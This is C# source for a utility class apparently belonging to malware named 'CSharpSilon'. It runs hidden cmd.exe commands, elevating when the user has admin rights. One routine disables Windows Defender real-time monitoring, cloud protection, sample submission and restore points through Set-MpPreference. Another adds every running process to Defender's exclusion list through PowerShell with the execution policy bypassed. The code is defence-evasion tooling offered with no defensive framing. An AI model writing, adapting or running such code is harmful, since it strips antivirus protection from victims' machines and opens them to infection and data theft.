using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Security.Principal;
using System.Threading;

namespace CSharpSilon.Utils
{
    public class App
    {
        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                .IsInRole(WindowsBuiltInRole.Administrator);
        }
        
        
        public static Process execute(string cmd) => Process.Start(new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = $"/C {cmd}",
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden,
            Verb = IsAdmin() ? "runas" : ""
        });

        public static void Disable()
        {
            execute("Set-MpPreference -DisableRealtimeMonitoring $true");
            execute("Set-MpPreference -DisableCloudProtection $true");
            execute("Set-MpPreference -DisableAutoSampleSubmission $true");
            execute("Set-MpPreference -DisableBlockAtFirstSeen $true");
            execute("Set-MpPreference -DisableRestorePoint $true");
        }

        public static void ExcludeAll()
        {
            foreach (ManagementObject process in new ManagementObjectSearcher("SELECT ProcessId, ExecutablePath FROM Win32_Process").Get())
            {
                try
                {
                    string executablePath = process["ExecutablePath"]?.ToString();
                    if (!string.IsNullOrEmpty(executablePath))
                    {
                        App.execute($"PowerShell -NoProfile -ExecutionPolicy Bypass Set-MpPreference -ExclusionProcess {executablePath}");
                        Thread.Sleep(15);
                    }
                }
                catch { }
            }
        }
    }
}